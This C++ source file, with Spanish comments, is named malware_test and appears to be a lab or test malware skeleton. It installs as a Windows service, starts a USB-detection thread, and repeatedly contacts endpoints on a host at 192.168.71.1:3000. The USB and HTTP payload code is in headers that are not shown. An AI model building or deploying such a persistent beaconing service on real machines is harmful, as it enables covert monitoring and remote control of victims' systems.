// malware_test.cpp: define el punto de entrada de la aplicación.
//

#include <windows.h>
#include <iostream>
#include <thread>
#include <fstream>
#include <filesystem>

#include "../libs/libcurl/headers/curl.h"
#include "include/usb_detection.h"
#include "include/http_calls.h"
#include "malware_test.h"

using namespace std;
namespace fs = std::filesystem;

SERVICE_STATUS        g_ServiceStatus = {};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;

void endpoint1() {
    requestEndpoint("http://192.168.71.1:3000/endpoint1", 10);
}

void endpoint2() {
    requestEndpoint("http://192.168.71.1:3000/endpoint2", 20);
}

void RunApplication() {
    curl_global_init(CURL_GLOBAL_ALL);

    std::thread usbThread(usbDetectionThread);
    std::thread httpThread1(endpoint1);
    std::thread httpThread2(endpoint2);

    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
        // Perform main service tasks here

        if (usbThread.joinable()) usbThread.join();
        if (httpThread1.joinable()) httpThread1.join();
        if (httpThread2.joinable()) httpThread2.join();
    }

    curl_global_cleanup();
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandler("MyService", ServiceCtrlHandler);
    if (g_StatusHandle == NULL) {
        return;
    }

    // Initialize Service Status
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;

    // Create the service stop event
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    // Report Running status when initialization is complete
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Run the service application
    RunApplication();

    CloseHandle(g_ServiceStopEvent);

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
    case SERVICE_CONTROL_STOP:
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

        SetEvent(g_ServiceStopEvent);

        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        break;

    default:
        break;
    }
}

int main(int argc, char* argv[]) {
    if (argc > 1 && strcmp(argv[1], "--service") == 0) {
        SERVICE_TABLE_ENTRY ServiceTable[] = {
            { (LPSTR)"MyService", (LPSERVICE_MAIN_FUNCTION)ServiceMain },
            { NULL, NULL }
        };

        if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
            return GetLastError();
        }
    }
    else {
        std::cout << "Running as app" << std::endl;
        RunApplication();
    }
    return 0;
}
